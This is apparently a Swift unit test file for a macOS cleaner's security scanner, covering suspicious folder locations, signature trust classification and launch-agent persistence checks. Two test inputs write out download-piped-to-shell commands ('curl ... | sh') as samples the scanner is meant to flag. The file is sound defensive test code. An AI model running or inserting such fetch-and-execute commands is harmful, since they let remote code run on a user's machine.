import Foundation
import Testing
@testable import MacCleaner

struct SecurityHeuristicsTests {
    private let home = "/Users/test"

    // MARK: - Locations

    @Test func temporaryAndSharedFoldersAreSuspicious() {
        #expect(SecurityLocationHeuristics.issues(for: "/tmp/.x/agent", home: home).contains(.temporaryFolder("/tmp")))
        #expect(SecurityLocationHeuristics.issues(for: "/private/tmp/agent", home: home).contains(.temporaryFolder("/private/tmp")))
        #expect(SecurityLocationHeuristics.issues(for: "/private/var/folders/xy/abc/T/run", home: home).contains(.temporaryFolder("/private/var/folders")))
        #expect(SecurityLocationHeuristics.issues(for: "/Users/Shared/updater", home: home) == [.sharedFolder])
    }

    @Test func hiddenFoldersAreSuspiciousExceptKnownToolchains() {
        #expect(SecurityLocationHeuristics.issues(for: "/Users/test/.hidden/bin/agent", home: home) == [.hiddenFolder(".hidden")])
        #expect(SecurityLocationHeuristics.issues(for: "/Users/test/Library/.cache-x/run", home: home) == [.hiddenFolder(".cache-x")])
        #expect(SecurityLocationHeuristics.issues(for: "/Users/test/.nvm/versions/node/v22.12.0/bin/node", home: home).isEmpty)
        #expect(SecurityLocationHeuristics.issues(for: "/Users/test/.cargo/bin/tool", home: home).isEmpty)
        #expect(SecurityLocationHeuristics.issues(for: "/Applications/Example.app/Contents/MacOS/Example", home: home).isEmpty)
        #expect(SecurityLocationHeuristics.issues(for: "/opt/homebrew/bin/redis-server", home: home).isEmpty)
    }

    @Test func randomLookingApplicationSupportFolders() {
        let issues = SecurityLocationHeuristics.issues(for: "/Users/test/Library/Application Support/com.4XFG7lqb4/agent", home: home)
        #expect(issues == [.randomApplicationSupportFolder("com.4XFG7lqb4")])
        #expect(SecurityLocationHeuristics.issues(for: "/Users/test/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater", home: home).isEmpty)
        #expect(SecurityLocationHeuristics.issues(for: "/Library/Application Support/3F2504E0-4F89-11D3-9A0C-0305E82C3301/run", home: home).count == 1)
    }

    @Test(arguments: [
        "a8f3c9d2e1b4", "3F2504E0-4F89-11D3-9A0C-0305E82C3301", "xkcdqwrtzp", "com.4XFG7lqb4", "a1b2c3d4", ".h7Gk2pQ9x", "zz9q8r7tk",
    ])
    func randomNames(name: String) {
        #expect(SecurityLocationHeuristics.looksRandom(name))
    }

    @Test(arguments: [
        "Google", "MathWorks", "claude-monitor", "com.apple.TCC", "Code", "1Password", "JetBrains", "Spotify", "zoom.us",
        "CrashReporter", "obs-studio", "Microsoft Edge", "Win32Helper", "Office365", "pgAdmin 4", "com.bitdefender.mac", "BraveSoftware",
        "MATLAB_R2024a", "Rhythmbox", "deadbeef",
    ])
    func productNames(name: String) {
        #expect(!SecurityLocationHeuristics.looksRandom(name))
    }

    // MARK: - Code trust

    private func signature(
        status: CodeSignatureInfo.Status,
        apple: Bool = false, appStore: Bool = false, developerID: Bool = false, adHoc: Bool = false,
        notarized: Bool? = nil, leaf: String? = nil
    ) -> CodeSignatureInfo {
        var info = CodeSignatureInfo()
        info.status = status
        info.isAppleSigned = apple
        info.isAppStoreSigned = appStore
        info.isDeveloperIDSigned = developerID
        info.isAdHocSigned = adHoc
        info.isNotarized = notarized
        info.authorities = leaf.map { [$0] } ?? []
        return info
    }

    @Test func classifiesSignatures() {
        func classify(_ info: CodeSignatureInfo, exists: Bool = true, script: Bool = false, manager: String? = nil, anchored: Bool = false) -> SecurityTrustCategory {
            SecurityCodeTrust.classify(info, exists: exists, isScript: script, packageManager: manager) { anchored }
        }
        #expect(classify(signature(status: .valid, apple: true)) == .apple)
        #expect(classify(signature(status: .valid, appStore: true)) == .appStore)
        #expect(classify(signature(status: .valid, developerID: true, notarized: true)) == .developerIDNotarized)
        #expect(classify(signature(status: .valid, developerID: true)) == .developerID)
        #expect(classify(signature(status: .valid, adHoc: true)) == .adHoc)
        #expect(classify(signature(status: .valid, adHoc: true), manager: "Homebrew") == .packageManager)
        #expect(classify(signature(status: .valid, leaf: "https://macked.app")) == .untrustedCertificate)
        #expect(classify(signature(status: .valid, leaf: "Apple iPhone OS Application Signing"), anchored: true) == .appStore)
        #expect(classify(signature(status: .valid, leaf: "Apple Development: dev@example.com (TEAM)"), anchored: true) == .appleDevelopment)
        #expect(classify(signature(status: .unsigned)) == .unsigned)
        #expect(classify(signature(status: .unsigned), script: true) == .script)
        #expect(classify(signature(status: .invalid)) == .invalid)
        #expect(classify(signature(status: .revoked)) == .revoked)
        #expect(classify(signature(status: .unknown)) == .unknown)
        #expect(classify(signature(status: .valid, apple: true), exists: false) == .missing)
    }

    @Test func trustCategoryGroups() {
        #expect(SecurityTrustCategory.adHoc.isUnknownDeveloper)
        #expect(!SecurityTrustCategory.unknown.isUnknownDeveloper)
        #expect(!SecurityTrustCategory.packageManager.isUnknownDeveloper)
        #expect(SecurityTrustCategory.untrustedCertificate.isSignatureProblem)
        #expect(SecurityTrustCategory.developerID.isNotarizationUnconfirmed)
        #expect(!SecurityTrustCategory.appStore.isNotarizationUnconfirmed)
    }

    @Test func packageManagerLocations() {
        #expect(SecurityCodeTrust.packageManager(forPath: "/opt/homebrew/bin/node", resolvedPath: "/opt/homebrew/Cellar/node/22.0.0/bin/node") == "Homebrew")
        #expect(SecurityCodeTrust.packageManager(forPath: "/opt/local/bin/port", resolvedPath: nil) == "MacPorts")
        #expect(SecurityCodeTrust.packageManager(forPath: "/usr/local/bin/tool", resolvedPath: "/usr/local/bin/tool") == nil)
    }

    @Test func scriptAndMachODetectionOnTemporaryFiles() throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("SecurityTrustTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let script = folder.appendingPathComponent("tool")
        try Data("#!/bin/sh\necho hi\n".utf8).write(to: script)
        let binary = folder.appendingPathComponent("binary")
        try Data([0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01]).write(to: binary)
        #expect(SecurityCodeTrust.isScriptFile(path: script.path))
        #expect(!SecurityCodeTrust.isMachOFile(path: script.path))
        #expect(SecurityCodeTrust.isMachOFile(path: binary.path))
        #expect(!SecurityCodeTrust.isScriptFile(path: binary.path))
        #expect(!SecurityCodeTrust.isScriptFile(path: folder.path))
    }

    // MARK: - Persistence assessment

    private func agent(
        label: String,
        arguments: [String],
        category: SecurityTrustCategory,
        runAtLoad: Bool = true,
        keepAlive: Bool = false,
        exists: Bool = true
    ) -> StartupItem {
        var definition = LaunchdJobDefinition()
        definition.label = label
        definition.programArguments = arguments
        definition.runAtLoad = runAtLoad
        definition.keepAlive = keepAlive ? .always : .off
        let existing = Set(exists ? arguments.filter { $0.hasPrefix("/") } : [])
        let environment = LaunchdProgramAnalyzer.Environment(fileExists: { existing.contains($0) }, appPathForBundleIdentifier: { _ in nil }, home: "/Users/test")
        var item = StartupItem(id: "userAgent|\(label)", kind: .userAgent, name: label)
        item.label = label
        item.plistPath = "/Users/test/Library/LaunchAgents/\(label).plist"
        item.definition = definition
        let analysis = LaunchdProgramAnalyzer.analyze(definition, environment: environment)
        item.analysis = analysis
        item.targetPath = analysis.targetPath
        if let target = analysis.targetPath {
            item.code = SecurityCodeEvaluation(path: target, exists: exists, signature: CodeSignatureInfo(), category: exists ? category : .missing)
        }
        return item
    }

    @Test func signedAgentInANormalPlaceIsNotFlagged() {
        let item = agent(label: "com.example.updater", arguments: ["/Applications/Example.app/Contents/MacOS/Updater"], category: .developerIDNotarized)
        let assessment = SecurityPersistenceAnalyzer.assess(item, home: "/Users/test")
        #expect(assessment.reasons.isEmpty)
        #expect(SecurityPersistenceAnalyzer.finding(for: item, reasons: assessment.reasons, match: assessment.match) == nil)
    }

    @Test func unsignedHiddenKeepAliveAgentIsSuspicious() throws {
        let item = agent(label: "com.example.sync", arguments: ["/Users/test/.sync/bin/syncd"], category: .unsigned, keepAlive: true)
        let assessment = SecurityPersistenceAnalyzer.assess(item, home: "/Users/test")
        let codes = Set(assessment.reasons.map(\.code))
        #expect(codes == ["signature-missing", "location", "keepalive-unknown"])
        let finding = try #require(SecurityPersistenceAnalyzer.finding(for: item, reasons: assessment.reasons, match: assessment.match))
        #expect(finding.severity == .suspicious)
        #expect(finding.category == .persistence)
        #expect(finding.title == "Suspicious launch agent: com.example.sync")
        #expect(finding.remediation == .userLaunchAgent(label: "com.example.sync", plistPath: "/Users/test/Library/LaunchAgents/com.example.sync.plist"))
        #expect(finding.reasons.count == 3)
    }

    @Test func appleLookingLabelWithoutAppleSignatureIsSuspicious() {
        let item = agent(label: "com.apple.updates", arguments: ["/Users/test/Library/Updates/agent"], category: .developerID)
        let codes = SecurityPersistenceAnalyzer.assess(item, home: "/Users/test").reasons.map(\.code)
        #expect(codes.contains("apple-name"))
    }

    @Test func inlineDownloadCodeIsSuspicious() {
        let item = agent(label: "com.example.boot", arguments: ["/bin/bash", "-c", "curl -s https://example.net/p | sh"], category: .apple)
        let reasons = SecurityPersistenceAnalyzer.assess(item, home: "/Users/test").reasons
        #expect(reasons.map(\.code) == ["inline-download"])
        #expect(reasons.first?.severity == .suspicious)
    }

    @Test func homebrewServicesAreNotFlaggedForAdHocSignatures() {
        let item = agent(label: "homebrew.mxcl.redis", arguments: ["/opt/homebrew/opt/redis/bin/redis-server"], category: .packageManager, keepAlive: true)
        #expect(SecurityPersistenceAnalyzer.assess(item, home: "/Users/test").reasons.isEmpty)
    }

    @Test func brokenItemsAreInformationOnly() throws {
        let item = agent(label: "com.example.gone", arguments: ["/Applications/Gone.app/Contents/MacOS/Gone"], category: .unsigned, exists: false)
        let assessment = SecurityPersistenceAnalyzer.assess(item, home: "/Users/test")
        #expect(assessment.reasons.map(\.code) == ["broken"])
        let finding = try #require(SecurityPersistenceAnalyzer.finding(for: item, reasons: assessment.reasons, match: assessment.match))
        #expect(finding.severity == .info)
        #expect(finding.title.hasPrefix("Broken launch agent"))
    }

    @Test func knownAdwareLabelIsAThreat() throws {
        let item = agent(label: "com.genieo.completer.update", arguments: ["/Users/test/Library/Application Support/Genieo/update"], category: .developerID)
        let assessment = SecurityPersistenceAnalyzer.assess(item, home: "/Users/test")
        let finding = try #require(SecurityPersistenceAnalyzer.finding(for: item, reasons: assessment.reasons, match: assessment.match))
        #expect(finding.severity == .threat)
        #expect(finding.category == .adware)
        #expect(finding.title == "Known adware/PUP rule match: Genieo")
        #expect(finding.ruleName == "Known adware/PUP rule match: Genieo")
        #expect(finding.finding.area == .security)
        #expect(finding.finding.destination == .security)
    }

    @Test func scriptRisksAreReported() {
        let item = agent(label: "com.example.script", arguments: ["/bin/sh", "/Users/test/bin/start.sh"], category: .script)
        let risk = SecurityShellRisk(kind: .downloadPipedToInterpreter, lineNumber: 3, line: "curl -s https://x | sh")
        let codes = SecurityPersistenceAnalyzer.assess(item, scriptRisks: [risk], home: "/Users/test").reasons.map(\.code)
        #expect(codes == ["script-risk"])
    }
}
